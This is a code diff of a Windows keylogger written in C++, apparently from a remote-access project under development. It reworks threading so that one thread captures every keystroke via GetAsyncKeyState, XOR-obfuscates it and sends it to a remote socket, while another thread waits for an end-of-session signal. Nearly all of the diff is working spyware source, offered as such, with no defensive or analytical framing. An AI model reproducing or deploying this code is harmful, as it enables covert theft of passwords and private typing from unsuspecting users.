@@ -2,16 +2,15 @@
 #include "../inc/Keylogger.h"
 #include "../inc/other.h"
 
-Keylogger::Keylogger(SOCKET &sock)
+Keylogger::Keylogger()
 {
-    a_sock = sock;;
-    wcout << "SOCK: " << a_sock << endl;
-    setup();
+    ;
 }
 
 
 VOID Keylogger::setup()
 {
+    
     DWORD dwProcessId;
     a_WindowHandle =  GetForegroundWindow(); //Récupère un handle vers la fenêtre de premier plan
     a_dwThreadId = GetWindowThreadProcessId(a_WindowHandle, &dwProcessId); //Récupère l'identifiant du thread qui a créé la fenêtre spécifiée
@@ -168,48 +167,46 @@ wstring Keylogger::intToUnicode(INT keystroke)
 }
 
 
-struct Keylogger::PARAMETERS
-{
-    SOCKET sock;
-};
-
-
- DWORD WINAPI Keylogger::StaticThreadStart(LPVOID param) //https://stackoverflow.com/questions/8994224/efficiently-passing-parameters-to-function-in-another-thread-in-c
-{
-   
-    PARAMETERS* params = (PARAMETERS*)param;
-    
-    wcout << "StaticThreadStart: " << params->sock << endl; 
-
-    Keylogger keylogger(params->sock);
-    keylogger.directTcp();
-  
-    return 0;
-}
-
-
-HANDLE Keylogger::startThread()
-{
-    wcout << "In startThread " << endl;
-
-    DWORD dwThreadID;
-    PARAMETERS *params = new PARAMETERS;  //I have to go through a structure to allow the socket to be initialized.  
-    params->sock =a_sock;
-
-    wcout << "starthread: " << params->sock << endl;
-    HANDLE thread_handler_keylogger = CreateThread(NULL, 0,  StaticThreadStart, params, 0 ,&dwThreadID); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
-    return thread_handler_keylogger;
-}
-
-
 VOID Keylogger::directTcp()
-{   
-    wcout << "goooo" <<endl;
+{
+    HANDLE threads[2];
+    wcout << "In startThread " << endl;
+    wcout <<"Address startThread: " << &a_sock << endl;
+    wcout << "Value socket: " << a_sock << endl;
 
+    wcout << "go to directTcp" << endl;
+    threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,&a_sock ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
+    threads[1] = CreateThread(NULL,0 ,recvDataThread ,&a_sock ,0 ,NULL);
+
+    Sleep(2000);
+    wcout << "WaitForMultipleObjects" << endl;
+    WaitForMultipleObjects(2,threads, TRUE, INFINITE); //https://stackoverflow.com/questions/43298052/windows-c-tcp-socket-sendrecv-at-the-same-time
+    wcout << "finish ? " << endl;
+}
+
+//--------------------------------------------------------------------------------------------------------
+VOID Keylogger::setSocket(SOCKET &sock)
+{
+    a_sock = sock;
+}
+
+Keylogger::~Keylogger()
+{;}
+
+//----------------------------------------------------------------------------------
+
+DWORD WINAPI sendKeystrokeThread(LPVOID param)
+{   
+    SOCKET sock = *(SOCKET *)param;
     wstring unicode_char;
+    
+    Keylogger keylogger;
+    keylogger.setup();
+
     while (true)
     {
         Sleep(10);
+
         for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
         {
             if(GetAsyncKeyState(keystroke) == -32767)
@@ -218,36 +215,40 @@ VOID Keylogger::directTcp()
                 if((keystroke>=39)&&(keystroke<91))
                 {
                     //not SpecialKey
-                    unicode_char = intToUnicode(keystroke);
+                    unicode_char = keylogger.intToUnicode(keystroke);
                 }
                 else
                 {
-                    unicode_char = specialKey(keystroke);
+                    unicode_char = keylogger.specialKey(keystroke);
                 }
-
                 wcout << "send char: "<<unicode_char << endl;
-                wcout << "len: " << unicode_char.length() << endl;
-                wcout << "sock: " << a_sock << endl;
-                int stattt = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
+                wcout << "sock address: " << &sock << endl;
+                int stattt = send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
                 wcout << "realy ????: " << stattt << endl;
             }
         }
     }
+
+    return 0;
 }
 
 
-VOID Keylogger::waitingEndSession(HANDLE &thread_to_finish)//waits to receive an end-of-connection message  for directTcp
+
+DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection message  for directTcp
 {
+    SOCKET sock = *(SOCKET *)param;
     WCHAR buff[512]={0};
     while(TRUE)
     {
-        int stat = recv(a_sock, (CHAR *)buff, sizeof(buff), 0);
+        wcout << "sock recvDataThread: " << sock << endl;
+        wcout << "recv recvDataThread: "<< &sock <<"\n\n\n" << endl;
+        INT stat = recv(sock, (CHAR *)buff, sizeof(buff), 0);
         if(stat == SOCKET_ERROR)
         {
             wcout << "SOCKET_ERROR" << endl;
             break;
         }
-        else if (buff == L"\r\n")
+        else if (XOREncryption( (wstring) buff) == L"\r\n")
         {
             wcout << "stop waitingEndSession" << endl;
             break;
@@ -260,11 +261,7 @@ VOID Keylogger::waitingEndSession(HANDLE &thread_to_finish)//waits to receive an
     }
     DWORD exitCode;
     wcout << "stop thread baby !" << endl;
-    TerminateThread(thread_to_finish, exitCode);
-    wcout << "exit code: " << exitCode << endl; 
+    //TerminateThread(thread_to_finish, exitCode);
+    //wcout << "exit code: " << exitCode << endl; 
+    return 0;
 }
-
-Keylogger::~Keylogger()
-{;}
-
-//----------------------------------------------------------------------------------
